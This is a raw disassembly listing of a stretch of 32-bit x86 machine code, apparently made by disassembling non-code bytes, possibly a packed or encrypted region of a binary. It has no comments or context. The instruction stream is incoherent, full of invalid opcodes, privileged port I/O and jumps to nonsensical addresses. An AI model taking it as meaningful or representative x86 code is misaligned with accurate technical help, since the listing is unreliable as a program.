  417c9c:	sub    BYTE PTR ds:0xa5e8c2f9,ah
  417ca2:	fcmovbe st,st(1)
  417ca4:	lods   al,BYTE PTR ds:[esi]
  417ca5:	(bad)  
  417ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ca7:	fmul   DWORD PTR [edx+esi*4-0xc]
  417cab:	out    dx,eax
  417cac:	daa    
  417cad:	outs   dx,BYTE PTR ds:[esi]
  417cae:	xor    ch,BYTE PTR [edx+eiz*1+0x29ba53ea]
  417cb5:	dec    esi
  417cb6:	std    
  417cb7:	mov    ebx,0x5f8cbcc3
  417cbc:	call   0xcd2d74b2
  417cc1:	pop    ds
  417cc2:	cmp    BYTE PTR ds:0x4e9558a4,ah
  417cc8:	jl     0x417d0c
  417cca:	inc    esi
  417ccb:	(bad)  
  417ccc:	daa    
  417ccd:	push   ds
  417cce:	jns    0x417ce9
  417cd0:	fbstp  TBYTE PTR [ebp+0x15]
  417cd3:	test   eax,0xefab4d1f
  417cd8:	loop   0x417d05
  417cda:	lods   eax,DWORD PTR ds:[esi]
  417cdb:	cmp    eax,0x9f47863f
  417ce0:	inc    esi
  417ce1:	cld    
  417ce2:	add    al,0xf1
  417ce4:	(bad)  
  417ce5:	(bad)  
  417ce6:	jb     0x417cde
  417ce8:	ins    DWORD PTR es:[edi],dx
  417ce9:	das    
  417cea:	jp     0x417d5c
  417cec:	mov    bh,0xe9
  417cee:	jecxz  0x417cd1
  417cf0:	cdq    
  417cf1:	test   BYTE PTR [esi],ch
  417cf3:	pop    eax
  417cf4:	dec    ebp
  417cf5:	push   0x22
  417cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cf8:	xchg   edx,eax
  417cf9:	std    
  417cfa:	inc    eax
  417cfb:	lea    esp,ds:0xb7fa53ba
  417d01:	pop    ds
  417d02:	and    eax,DWORD PTR [ebx+0x4d073622]
  417d08:	shl    BYTE PTR ds:0x3af32caf,cl
  417d0e:	add    DWORD PTR es:[edx],edi
  417d11:	or     BYTE PTR fs:[eax-0x5c947402],dh
  417d18:	add    eax,DWORD PTR ds:0x457f6745
  417d1e:	int    0x1a
  417d20:	(bad)  
  417d21:	push   ebx
  417d22:	jle    0x417ca6
  417d24:	pop    esi
  417d25:	inc    ebx
  417d26:	(bad)  {k2}
  417d2b:	or     eax,0x2506857
  417d30:	out    0x28,al
  417d32:	xor    BYTE PTR [edi+esi*1-0x29],dl
  417d36:	in     eax,0x56
  417d38:	jb     0x417da8
  417d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d3b:	jns    0x417d24
  417d3d:	pop    esi
  417d3e:	inc    eax
  417d3f:	inc    esi
  417d40:	out    dx,al
  417d41:	fst    DWORD PTR [ebp+0x7de764a6]
  417d47:	mov    eax,0xcaa5e013
  417d4c:	lock add DWORD PTR cs:[ebp+0x28],esi
  417d51:	jno    0x417dc3
  417d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d54:	stos   DWORD PTR es:[edi],eax
  417d55:	pop    esp
  417d56:	jge    0x417d36
  417d58:	js     0x417d94
  417d5a:	outs   dx,BYTE PTR ds:[esi]
  417d5b:	sbb    eax,0x505c62c1
  417d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d61:	add    cl,bh
  417d63:	jecxz  0x417d12
  417d65:	mov    WORD PTR [ebp+eiz*8-0x73],gs
  417d69:	lahf   
  417d6a:	pop    eax
  417d6b:	add    edi,DWORD PTR [ebp-0x28]
  417d6e:	pop    ss
  417d6f:	jmp    0x9ab1:0xaf73549f
  417d76:	sub    bl,BYTE PTR [ecx+0x2b]
  417d79:	dec    DWORD PTR [eax-0x4c]
  417d7c:	in     al,dx
  417d7d:	sub    ebp,DWORD PTR [eax+0x4a]
  417d80:	lods   eax,DWORD PTR ds:[esi]
  417d81:	stos   DWORD PTR es:[edi],eax
  417d82:	icebp  
  417d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d84:	mov    dh,0x15
  417d86:	test   al,0x85
  417d88:	mov    ds:0xa2732b6c,al
  417d8d:	pop    edi
  417d8e:	das    
  417d8f:	mov    DWORD PTR [edx+0x7c],edi
  417d92:	pop    esp
  417d93:	mov    al,ds:0xbc671de8
  417d98:	in     eax,dx
  417d99:	mov    ecx,0x758dfe29
  417d9e:	inc    ebx
  417d9f:	aad    0x55
  417da1:	jo     0x417db3
  417da3:	xchg   esi,eax
  417da4:	jg     0x417d50
  417da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417da7:	sub    esi,DWORD PTR [edi]
  417da9:	out    0x92,al
  417dab:	push   ss
  417dac:	ret    
  417dad:	mov    ds:0xdac122df,eax
  417db2:	arpl   WORD PTR [eax+0x43],bp
  417db5:	(bad)  
  417db6:	mov    es,WORD PTR [edx+0x3f]
  417db9:	imul   ebp,DWORD PTR [edx+0x7],0xffffffc0
  417dbd:	inc    ecx
  417dbe:	xor    eax,edx
  417dc0:	or     DWORD PTR [edi+eax*8+0x196a7ba],0x25b02e1c
  417dcb:	or     BYTE PTR ds:0xbfc323bc,0xe6
  417dd2:	mov    ah,0x68
  417dd4:	inc    edx
  417dd5:	test   BYTE PTR [ebx-0x601be90d],al
  417ddb:	or     BYTE PTR [edi],0x5d
  417dde:	inc    ebp
  417ddf:	ja     0x417dbe
  417de1:	test   DWORD PTR [eax],eax
  417de3:	sub    cl,BYTE PTR [ebx-0x2992f80b]
  417de9:	push   ebx
  417dea:	xchg   ebx,eax
  417deb:	or     edx,DWORD PTR [ecx]
  417ded:	xlat   BYTE PTR ds:[ebx]
  417dee:	arpl   si,di
  417df0:	shr    esp,1
  417df2:	adc    DWORD PTR [ebp-0x7],0x14490746
  417df9:	mov    esi,0x870b3093
  417dfe:	pop    ebp
  417dff:	cmp    al,0xf6
  417e01:	jns    0x417e65
  417e03:	xchg   BYTE PTR [ebp+ebp*8+0x44c3c296],dh
  417e0a:	dec    esi
  417e0b:	sbb    BYTE PTR [eax*4+0x270b6b9],dh
  417e12:	lods   eax,DWORD PTR ds:[esi]
  417e13:	jbe    0x417db3
  417e15:	pushf  
  417e16:	ret    
  417e17:	add    eax,0x7c79fe8e
  417e1c:	push   ecx
  417e1d:	cmp    BYTE PTR [ecx-0x4b],dh
  417e20:	adc    eax,DWORD PTR [esi]
  417e22:	mov    eax,ds:0x5b4b2fca
  417e27:	pusha  
  417e28:	data16 mov al,ds:0xf04851c6
  417e2e:	out    0x0,eax
  417e30:	adc    al,0xad
  417e32:	pop    esp
  417e33:	jmp    0x417e7a
  417e35:	ds arpl dx,dx
  417e38:	mov    ds:0x46e02cfd,al
  417e3d:	aas    
  417e3e:	push   0xffffff80
  417e40:	dec    esp
  417e41:	xor    al,BYTE PTR [ebp+0x6b]
  417e44:	(bad)  
  417e46:	lods   al,BYTE PTR ds:[esi]
  417e47:	js     0x417ec2
  417e49:	pop    edx
  417e4a:	test   al,0xfd
  417e4c:	dec    edi
  417e4d:	mov    esi,0x8cc6c62e
  417e52:	outs   dx,DWORD PTR ds:[esi]
  417e53:	xchg   ebp,eax
  417e54:	or     BYTE PTR [ecx],dl
  417e56:	aam    0xee
  417e58:	pop    ebx
  417e59:	dec    esp
  417e5a:	xchg   BYTE PTR [ebx+0x69],dh
  417e5d:	or     cl,BYTE PTR [edi]
  417e5f:	sub    BYTE PTR [esp+edi*8+0xda7845a],0x12
  417e67:	out    0x60,eax
  417e69:	out    0x8b,al
  417e6b:	cli    
  417e6c:	xor    DWORD PTR [edi-0x701627b8],ecx
  417e72:	retf   0x5d6b
  417e75:	sbb    BYTE PTR [ebx+ebp*4-0x57],bh
  417e79:	adc    BYTE PTR [ebx+0x56],cl
  417e7c:	sub    DWORD PTR gs:[edi+0x46f72cfb],ecx
  417e83:	out    dx,eax
  417e84:	push   edx
  417e85:	pop    ebx
  417e86:	imul   ebp,esp,0x27
  417e89:	push   ecx
  417e8a:	jne    0x417e24
  417e8c:	and    BYTE PTR [esi],cl
  417e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e8f:	in     al,0x96
  417e91:	outs   dx,BYTE PTR ds:[esi]
  417e92:	xchg   ebp,ecx
  417e94:	es dec edi
  417e96:	imul   ecx,DWORD PTR [edi+0x45d2ee9e],0x5c235087
  417ea0:	lds    esi,FWORD PTR [ecx+0x24dc08b6]
  417ea6:	add    BYTE PTR [ebx],ch
  417ea8:	adc    DWORD PTR [eax+ebx*8+0x65],0xffffffc1
  417ead:	push   edi
  417eae:	pop    edi
  417eaf:	jnp    0x417e82
  417eb1:	div    edx
  417eb3:	jg     0x417ea3
  417eb5:	xor    DWORD PTR [ebx+0x9b47f31],ebx
  417ebb:	sub    BYTE PTR [ebx-0x46b428fe],dh
  417ec1:	call   0x11d31e23
  417ec6:	mov    al,ds:0x65fcda76
  417ecb:	nop
  417ecc:	cli    
  417ecd:	cmp    al,0xc5
  417ecf:	pop    ebx
  417ed0:	pop    eax
  417ed1:	lock push esi
  417ed3:	sbb    cl,BYTE PTR [eax+0x5c140296]
  417ed9:	sub    eax,0xab572dac
  417ede:	dec    ebx
  417edf:	lods   al,BYTE PTR ds:[esi]
  417ee0:	add    eax,0xfebd59d3
  417ee5:	sbb    al,0xf2
  417ee7:	mov    dl,0xc8
  417ee9:	stos   BYTE PTR es:[edi],al
  417eea:	dec    eax
  417eeb:	jp     0x417e75
  417eed:	push   esi
  417eee:	xchg   DWORD PTR [ebx],ebx
  417ef0:	dec    ebx
  417ef1:	inc    eax
  417ef2:	push   0xffffffc1
  417ef4:	cmc    
  417ef5:	adc    BYTE PTR [edx+0x7a230a30],cl
  417efb:	loopne 0x417edf
  417efd:	retf   
  417efe:	ja     0x417f0a
  417f00:	les    esi,FWORD PTR [ebx-0x42881560]
  417f06:	aad    0xdb
  417f08:	dec    ebx
  417f09:	pop    eax
  417f0a:	in     al,dx
  417f0b:	sbb    DWORD PTR [ebp-0x241bfd7e],edi
  417f11:	jl     0x417e95
  417f13:	mov    BYTE PTR [eax+0x7c],al
  417f16:	(bad)
  417f19:	inc    edi
  417f1a:	int    0x2a
  417f1c:	sub    al,0x54
  417f1e:	adc    bh,BYTE PTR [eax-0x10b6a812]
  417f24:	ret    0xcf90
  417f27:	ja     0x417f1b
  417f29:	aad    0x51
  417f2b:	bound  esp,QWORD PTR ds:0x9724f999
  417f31:	xchg   edx,eax
  417f32:	cmp    BYTE PTR [ecx],0x8e
  417f35:	push   ecx
  417f36:	pop    eax
  417f37:	std    
  417f38:	mov    al,ds:0xabc87fcf
  417f3d:	jmp    0xa78c38da
  417f42:	imul   edx,DWORD PTR gs:[ebx+0x31],0x47
  417f47:	cdq    
  417f48:	dec    esi
  417f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f4a:	retf   
  417f4b:	pop    ebx
  417f4c:	sbb    ecx,esp
  417f4e:	cld    
  417f4f:	ja     0x417f32
  417f51:	(bad)  
  417f52:	or     DWORD PTR [eax],ebp
  417f54:	add    ch,ch
  417f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f57:	push   ecx
  417f58:	mov    ebx,0xcb7b5cbd
  417f5d:	pop    ss
  417f5e:	int3   
  417f5f:	repz mov ebx,0x6824d54f
  417f65:	inc    esi
  417f66:	neg    ecx
  417f68:	loope  0x417f30
  417f6a:	into   
  417f6b:	mov    ds:0xa62b92dc,eax
  417f70:	and    eax,0x31fad5ca
  417f75:	ss push cs
  417f77:	aad    0x6d
  417f79:	jb     0x417fc9
  417f7b:	mov    DWORD PTR [esi],esi
  417f7d:	aad    0xab
  417f7f:	jl     0x417fed
  417f81:	(bad)  
  417f82:	xlat   BYTE PTR ds:[ebx]
  417f83:	mov    ebx,0x9da0209c
  417f88:	pop    ebx
  417f89:	adc    edi,DWORD PTR [esi+0x7bb09c3c]
  417f8f:	in     eax,dx
  417f90:	sbb    bh,BYTE PTR [edi]
  417f92:	dec    esi
  417f93:	and    ch,BYTE PTR [ecx+0x78622195]
  417f99:	jmp    0xd9cac97b
  417f9e:	xchg   ebp,eax
  417f9f:	sbb    eax,0xceae05cc
  417fa4:	scas   al,BYTE PTR es:[edi]
  417fa5:	or     BYTE PTR [esi],bh
  417fa7:	ins    DWORD PTR es:[edi],dx
  417fa8:	mov    es,WORD PTR [esi]
  417faa:	push   esi
  417fab:	daa    
  417fac:	jmp    0x417f72
  417fae:	test   eax,0x276e8f1b
  417fb3:	sub    DWORD PTR [eax-0x7fea7440],0x823c1b10
  417fbd:	popa   
  417fbe:	retf   0x8040
  417fc1:	inc    eax
  417fc2:	jmp    0x418040
  417fc4:	or     al,0x34
  417fc6:	xchg   edx,eax
  417fc7:	ret    0xb7c6
  417fca:	(bad)  
  417fcb:	out    0xd1,eax
  417fcd:	xor    DWORD PTR [ebp+0x25],esi
  417fd0:	inc    esi
  417fd1:	and    ebx,DWORD PTR [eax+0x1c]
  417fd4:	dec    esp
  417fd5:	les    eax,FWORD PTR [edx]
  417fd7:	adc    DWORD PTR [edi],edx
  417fd9:	cdq    
  417fda:	retf   0x1fcd
  417fdd:	mov    edi,?
  417fdf:	jno    0x417fe5
  417fe1:	mov    edx,0x2d4cda68
  417fe6:	dec    ecx
  417fe7:	add    DWORD PTR [eax-0x6b],edi
  417fea:	cdq    
  417feb:	mov    al,ds:0x60b4e076
  417ff0:	call   0xab702f5d
  417ff5:	cmp    dl,BYTE PTR [edi-0x59]
  417ff8:	out    dx,al
  417ff9:	ins    BYTE PTR es:[edi],dx
  417ffa:	sub    BYTE PTR [esi-0x41],dl
  417ffd:	inc    ecx
  417ffe:	jbe    0x418015
  418000:	fcom   DWORD PTR [edx]
  418002:	inc    eax
  418003:	add    dh,BYTE PTR [esi+0x2]
  418006:	(bad)  [edi-0x5d4f4bc9]
  41800c:	sbb    eax,0xd56bbfa1
  418011:	xchg   edx,eax
  418012:	ret    
  418013:	test   eax,0xd6de195d
  418018:	jae    0x417fe9
  41801a:	mov    eax,ds:0xd49eb242
  41801f:	xchg   esi,eax
  418020:	cmp    al,0x1
  418022:	inc    ebx
  418023:	cdq    
  418024:	dec    ebx
  418025:	stos   DWORD PTR es:[edi],eax
  418026:	nop
  418027:	ds xchg esi,eax
  418029:	and    esi,DWORD PTR [ebx+0x42]
  41802c:	test   DWORD PTR [ebp-0x5ba0579f],edx
  418032:	push   0xc95d2de7
  418037:	daa    
  418038:	f2xm1  
  41803a:	pop    edx
  41803b:	repz popa 
  41803d:	js     0x4180a1
  41803f:	jp     0x418050
  418041:	mov    BYTE PTR [esp+edx*2-0x3a849ad0],bl
  418048:	cmp    al,bl
  41804a:	xor    ecx,DWORD PTR [edx+0x1ecb0014]
  418050:	inc    edi
  418051:	iret   
  418052:	lgs    edx,FWORD PTR [edi+0x769e2ada]
  418059:	or     DWORD PTR [edi],ebp
  41805b:	cs cmp al,0xd9
  41805e:	clc    
  41805f:	iret   
  418060:	inc    esp
  418061:	into   
  418062:	cs mov ?,edx
  418065:	inc    BYTE PTR [ecx-0x7f8561bd]
  41806b:	ret    
  41806c:	pop    esi
  41806d:	cmc    
  41806e:	ins    DWORD PTR es:[edi],dx
  41806f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418071:	mov    al,0x2
  418073:	(bad)  
  418074:	(bad)  
  418075:	jecxz  0x4180bb
  418077:	cdq    
  418078:	retf   0x2528
  41807b:	push   edx
  41807c:	mov    dl,0xcb
  41807e:	cmp    eax,0x3eb73dac
  418083:	pusha  
  418084:	and    eax,0x487e6604
  418089:	jns    0x41805c
  41808b:	iret   
  41808c:	adc    ah,BYTE PTR [edx+0x27]
  41808f:	inc    ebx
  418090:	sub    eax,0x7ff7f85c
  418095:	or     eax,0x591740df
  41809a:	fucomip st,st(5)
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	in     eax,dx
  41809e:	lahf   
  41809f:	dec    esp
  4180a0:	fadd   DWORD PTR [ecx]
  4180a2:	iret   
  4180a3:	ja     0x4180c3
  4180a5:	add    ch,BYTE PTR [edx-0x26]
  4180a8:	mov    ecx,0x22f3ad5b
  4180ad:	call   0xc92cf163
  4180b2:	adc    al,0x83
  4180b4:	and    ecx,esi
  4180b6:	push   eax
  4180b7:	lea    esi,[ebp-0x674a8c0a]
  4180bd:	sub    eax,eax
  4180bf:	sub    al,0x66
  4180c1:	or     eax,0x1a41cd5a
  4180c6:	out    0xb0,al
  4180c8:	test   DWORD PTR es:[esi+ebx*1],esi
  4180cc:	fmul   QWORD PTR [esi]
  4180ce:	lods   eax,DWORD PTR ds:[esi]
  4180cf:	mov    cs,esp
  4180d1:	sbb    DWORD PTR [esi+0x5a],ebp
  4180d4:	aam    0x22
  4180d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d7:	sbb    cl,dl
  4180d9:	loope  0x41814c
  4180db:	xchg   DWORD PTR [eax+0x70],esp
  4180de:	mov    ch,0x82
  4180e0:	cmp    al,BYTE PTR [edi+ecx*4+0x6d]
  4180e4:	push   eax
  4180e5:	mov    ebp,0x201ab15f
  4180ea:	mov    esi,0x6039b41e
  4180ef:	adc    eax,0xba505c37
  4180f4:	and    bl,BYTE PTR [edx+0x48]
  4180f7:	out    0x32,al
  4180f9:	ds js  0x41807d
  4180fc:	xor    al,0x44
  4180fe:	sub    al,0xa3
  418100:	xor    al,0x84
  418102:	mov    WORD PTR [ebp+0x77],?
  418105:	sub    al,0x4d
  418107:	retf   0x8814
  41810a:	or     al,0x7
  41810c:	push   ds
  41810d:	pop    ecx
  41810e:	cs imul edx,ebx,0x26092b3b
  418115:	adc    ebx,edx
  418117:	mov    cl,dl
  418119:	dec    esp
  41811a:	xor    BYTE PTR [edi+eax*2+0x3f6ead1b],al
  418121:	stos   DWORD PTR es:[edi],eax
  418122:	mov    ss,WORD PTR [ecx]
  418124:	jp     0x4180e9
  418126:	test   DWORD PTR [esi],esp
  418128:	cmp    DWORD PTR [eax-0x7e],0x895d2553
  41812f:	mov    eax,ds:0x8c2ad9a0
  418134:	ret    
  418135:	das    
  418136:	(bad)  
  418137:	int    0xba
  418139:	call   0xf1e8:0x5fb44f3f
  418140:	cld    
  418141:	dec    ebp
  418142:	jmp    0x5d0353c9
  418147:	idiv   DWORD PTR ds:0x9441dc44
  41814d:	lods   eax,DWORD PTR ds:[esi]
  41814e:	cmp    esp,DWORD PTR [eax-0x50be1269]
  418154:	in     eax,0xbe
  418156:	shl    eax,0xb0
  418159:	in     eax,dx
  41815a:	leave  
  41815b:	pop    edi
  41815c:	daa    
  41815d:	inc    eax
  41815e:	(bad)  
  41815f:	outs   dx,BYTE PTR ds:[esi]
  418160:	adc    eax,0xb1786a88
  418165:	mov    ds:0xbcdac459,al
  41816a:	fdivr  DWORD PTR [ecx-0x5f39fcb]
  418170:	hlt    
  418171:	aas    
  418172:	sbb    al,0x8c
  418174:	inc    eax
  418175:	ret    0x6e92
  418178:	push   0xa2bb1e24
  41817d:	push   esp
  41817e:	rcr    DWORD PTR [ebx+0x47],cl
  418181:	dec    eax
  418182:	xlat   BYTE PTR ds:[ebx]
  418183:	pop    esp
  418184:	sbb    DWORD PTR [ecx+0x5f43e102],eax
  41818a:	inc    ebp
  41818b:	stos   DWORD PTR es:[edi],eax
  41818c:	mov    esi,0x62b6c765
  418191:	mov    dh,0x9c
  418193:	add    DWORD PTR [esi+0x510883f4],0xffffffab
  41819a:	arpl   si,cx
  41819c:	adc    DWORD PTR [edx+0x77da8d5f],ebp
  4181a2:	sbb    eax,0xcc223e3b
  4181a7:	inc    edx
  4181a8:	int    0xd9
  4181aa:	inc    ebx
  4181ab:	shl    DWORD PTR [ecx],0xf1
  4181ae:	outs   dx,DWORD PTR ds:[esi]
  4181af:	push   eax
  4181b0:	imul   esi,DWORD PTR [esp+ebx*2-0x1c39918],0xffffff99
  4181b8:	sti    
  4181b9:	jmp    0x418140
  4181bb:	push   ecx
  4181bc:	sbb    esp,ebp
  4181be:	cmp    al,0x3c
  4181c0:	pop    ss
  4181c1:	jnp    0x41816d
  4181c3:	out    dx,al
  4181c4:	test   eax,0x27e81d4b
  4181c9:	(bad)  
  4181cb:	test   ah,cl
  4181cd:	xor    BYTE PTR ss:[ebp+0x3d55038e],dh
  4181d4:	xchg   edx,eax
  4181d5:	retf   0x824d
  4181d8:	adc    dl,BYTE PTR [esi-0x1e]
  4181db:	sbb    BYTE PTR [esi+0x5aa66a],ch
  4181e1:	cwde   
  4181e2:	addr16 cdq 
  4181e4:	and    cl,bh
  4181e6:	aas    
  4181e7:	scas   eax,DWORD PTR es:[edi]
  4181e8:	sub    DWORD PTR [esi-0xd1d50d3],0x63
  4181ef:	inc    eax
  4181f0:	scas   eax,DWORD PTR es:[edi]
  4181f1:	fisubr WORD PTR [eax]
  4181f3:	jno    0x41822b
  4181f5:	cmp    eax,0x97448898
  4181fa:	sbb    BYTE PTR [esi+0x45],0x91
  4181fe:	hlt    
  4181ff:	div    BYTE PTR [ebx]
  418201:	jl     0x4181ab
  418203:	or     edi,DWORD PTR [edi-0x20]
  418206:	(bad)  
  418207:	ja     0x418207
  418209:	dec    sp
  41820b:	xlat   BYTE PTR ds:[ebx]
  41820c:	add    al,0x3b
  41820e:	xor    DWORD PTR [ebx],edi
  418210:	cli    
  418211:	or     al,0x53
  418213:	add    ecx,DWORD PTR [edi]
  418215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418216:	retf   
  418217:	xor    DWORD PTR [esi],ecx
  418219:	mov    esi,DWORD PTR [eax]
  41821b:	dec    edx
  41821c:	jb     0x4181d4
  41821e:	stos   DWORD PTR es:[edi],eax
  41821f:	sbb    BYTE PTR [edx+eax*2-0x13],dh
  418223:	sub    BYTE PTR [ecx-0x2ab6ddc9],0x4d
  41822a:	jne    0x41823b
  41822c:	shr    DWORD PTR [ebx+0x4f],1
  41822f:	mov    dh,BYTE PTR [ebp-0x49]
  418232:	dec    esi
  418233:	sbb    BYTE PTR [ebx-0x4ec9c783],0x48
  41823a:	sbb    eax,0x8f27a429
  41823f:	sbb    dh,cl
  418241:	stc    
  418242:	xchg   esi,eax
  418243:	push   ecx
  418244:	popa   
  418245:	pop    ds
  418246:	mov    al,0x9a
  418248:	ins    DWORD PTR es:[edi],dx
  418249:	repz repnz xchg edi,eax
  41824c:	pop    ds
  41824d:	jno    0x4181e4
  41824f:	xchg   edi,eax
  418250:	add    cl,BYTE PTR ds:0xdb43abeb
  418256:	cli    
  418257:	jg     0x41821b
  418259:	cli    
  41825a:	pop    ss
  41825b:	fmul   st(4),st
  41825d:	xchg   edi,eax
  41825e:	stc    
  41825f:	fwait
  418260:	loope  0x4182d0
  418262:	push   0x62d8991f
  418267:	bound  ebx,QWORD PTR [eax+edx*1]
  41826a:	mov    ebx,0xd9d78751
  41826f:	cmp    BYTE PTR [eax],dh
  418271:	and    ecx,ebx
  418273:	clc    
  418274:	fwait
  418275:	and    ah,BYTE PTR [edi]
  418277:	outs   dx,DWORD PTR ds:[esi]
  418278:	jge    0x41821f
  41827a:	pop    es
  41827b:	in     eax,dx
  41827c:	or     DWORD PTR [ebx],edx
  41827e:	fmul   QWORD PTR [edx+0xc]
  418281:	or     esi,0x2dc46603
  418287:	rcl    BYTE PTR [ecx+0x503a1822],1
  41828d:	out    dx,al
  41828e:	xchg   BYTE PTR [ebp+edi*4+0x45209377],bl
  418295:	adc    dh,BYTE PTR [ecx-0xd64fb3e]
  41829b:	sbb    DWORD PTR [edx+0x76],edi
  41829e:	popf   
  41829f:	and    eax,0x817b82bc
  4182a4:	cmp    esp,ebx
  4182a6:	stos   DWORD PTR es:[edi],eax
  4182a7:	retf   
  4182a8:	push   esp
  4182a9:	clc    
  4182aa:	std    
  4182ab:	pop    edi
  4182ac:	scas   eax,DWORD PTR es:[edi]
  4182ad:	cmp    BYTE PTR [ebp+edx*2+0x72972eb],ch
  4182b4:	out    0x5d,al
  4182b6:	pop    ebx
  4182b7:	pusha  
  4182b8:	jns    0x418317
  4182ba:	out    0x48,eax
  4182bc:	sbb    bx,si
  4182bf:	xchg   ecx,eax
  4182c0:	mov    dh,0x5f
  4182c2:	xchg   edi,eax
  4182c3:	mov    edi,0x47fe8a83
  4182c8:	and    ebp,edx
  4182ca:	in     eax,0x96
  4182cc:	data16 mov al,0xbc
  4182cf:	fdiv   DWORD PTR [ecx]
  4182d1:	mov    dh,0xdf
  4182d3:	div    bh
  4182d5:	test   al,0x80
  4182d7:	out    dx,eax
  4182d8:	imul   BYTE PTR [ecx-0x6acdc68c]
  4182de:	dec    ebp
  4182df:	outs   dx,DWORD PTR ds:[esi]
  4182e0:	dec    esi
  4182e1:	sbb    BYTE PTR [ecx+0x3f],al
  4182e4:	xchg   esp,eax
  4182e5:	loopne 0x4182de
  4182e7:	retf   0xca61
  4182ea:	scas   eax,DWORD PTR es:[edi]
  4182eb:	cdq    
  4182ec:	lahf   
  4182ed:	jns    0x41834a
  4182ef:	mov    ebx,0xf48feb20
  4182f4:	inc    esp
  4182f6:	mul    cl
  4182f8:	scas   eax,DWORD PTR es:[edi]
  4182f9:	adc    bl,BYTE PTR [ecx+0x29c84a3f]
  4182ff:	push   ebp
  418300:	nop
  418301:	adc    DWORD PTR ds:0xacbd6a3a,ecx
  418307:	cdq    
  418308:	int3   
  418309:	pop    es
  41830a:	das    
  41830b:	cmp    BYTE PTR [esi],0xf1
  41830e:	cmp    eax,0x3a489193
  418313:	fadd   DWORD PTR [ebp-0x25b0efbf]
  418319:	ret    
  41831a:	dec    edx
  41831b:	icebp  
  41831c:	sar    BYTE PTR [edx],1
  41831e:	outs   dx,DWORD PTR ds:[esi]
  41831f:	mov    dh,0xf8
  418321:	(bad)  
  418322:	push   ds
  418323:	loop   0x41838a
  418325:	pusha  
  418326:	or     BYTE PTR [esi-0x7acffa3d],0xc0
  41832d:	jne    0x418314
  41832f:	sbb    ebp,DWORD PTR [ebx+0x1440a08b]
  418335:	mov    ds:0x8e1650a1,al
  41833a:	adc    DWORD PTR [ebp+0x74],edx
  41833d:	out    0xc9,al
  41833f:	push   es
  418340:	pop    edx
  418341:	ret    
  418342:	cld    
  418343:	xchg   ecx,eax
  418344:	add    ebp,ecx
  418346:	je     0x4182ed
  418348:	dec    ebx
  418349:	jnp    0x41835e
  41834b:	fs cmc 
  41834d:	mov    ecx,0xa38b3569
  418352:	sahf   
  418353:	(bad)  
  418354:	into   
  418355:	or     DWORD PTR [ebx+0x15],edi
  418358:	ins    BYTE PTR es:[edi],dx
  418359:	mov    ebx,edx
  41835b:	in     al,0xab
  41835d:	cmp    eax,DWORD PTR [edx-0xccd7598]
  418363:	dec    edx
  418364:	cli    
  418365:	stc    
  418366:	sbb    eax,0xe12ed270
  41836b:	or     BYTE PTR [edx-0x78],al
  41836e:	mov    eax,0x73431640
  418373:	retf   
  418374:	or     eax,0xb8b03641
  418379:	test   eax,0xeefa01a4
  41837e:	pop    edx
  41837f:	push   esp
  418380:	bnd ret 
  418382:	xchg   edi,eax
  418383:	mov    cl,0x36
  418385:	mov    esi,0x531962cc
  41838a:	inc    ecx
  41838b:	push   0xffb1358b
  418390:	mov    cl,0x33
  418392:	xchg   BYTE PTR ds:0x3f373dc3,bh
  418398:	inc    eax
  418399:	mov    bl,0x75
  41839b:	(bad)  
  41839c:	mov    esp,0xed91f1c1
  4183a1:	leave  
  4183a2:	loopne 0x418394
  4183a4:	test   DWORD PTR [eax+0x1e8ad84a],edi
  4183aa:	or     dl,cl
  4183ac:	aaa    
  4183ad:	jmp    0x41834a
  4183af:	sahf   
  4183b0:	pusha  
  4183b1:	loopne 0x418380
  4183b3:	adc    eax,0x55354be
  4183b8:	xchg   edi,ecx
  4183ba:	xor    eax,0x21c9fc46
  4183bf:	mov    bl,0x8f
  4183c1:	ret    
  4183c2:	mov    bh,0x87
  4183c4:	or     eax,0xf798081c
  4183c9:	cmp    al,0xc5
  4183cb:	cmc    
  4183cc:	mov    esi,0xfd2cd406
  4183d1:	test   DWORD PTR [ebx-0x4be81c49],0xf1630b41
  4183db:	mov    al,0xc7
  4183dd:	sbb    eax,0xa1b9fbdc
  4183e2:	ret    
  4183e3:	fldenv [ebp-0x787a3ffa]
  4183e9:	loop   0x41843d
  4183eb:	test   DWORD PTR [edi-0x56],ebx
  4183ee:	add    esp,esi
  4183f0:	loopne 0x418455
  4183f2:	pop    eax
  4183f3:	shl    DWORD PTR [esi],cl
  4183f5:	dec    edx
  4183f6:	inc    BYTE PTR [ecx-0x528923e9]
  4183fc:	stos   BYTE PTR es:[edi],al
  4183fd:	std    
  4183fe:	add    DWORD PTR [esi],0x8f464d99
  418404:	stc    
  418405:	fbstp  TBYTE PTR [edx+0x409f2313]
  41840b:	jecxz  0x418480
  41840d:	call   0xead7:0x5210d47b
  418414:	rcl    bl,0x81
  418417:	aas    
  418418:	push   esi
  418419:	or     eax,0xb4d35a0f
  41841e:	dec    ecx
  41841f:	xor    BYTE PTR [ebx+0x22b1d8b2],dl
  418425:	je     0x418425
  418427:	or     ebp,esi
  418429:	pop    ebp
  41842a:	sbb    eax,0x7c3b3f8b
  41842f:	push   edi
  418430:	push   edi
  418431:	popf   
  418432:	push   ds
  418433:	mov    DWORD PTR [edi],ebx
  418435:	inc    ebp
  418436:	mov    BYTE PTR [edx],bl
  418438:	mov    dl,0xd7
  41843a:	pop    esp
  41843b:	cwde   
  41843c:	(bad)
  41843f:	xchg   bh,ch
  418441:	add    BYTE PTR [eax],dh
  418443:	retf   0xb70f
  418446:	inc    ecx
  418447:	cmp    BYTE PTR ds:0x6e006222,bl
  41844d:	jo     0x418445
  41844f:	push   esi
  418450:	test   al,0x7
  418452:	add    ch,BYTE PTR [edi]
  418454:	and    dl,BYTE PTR [edi+0x5f]
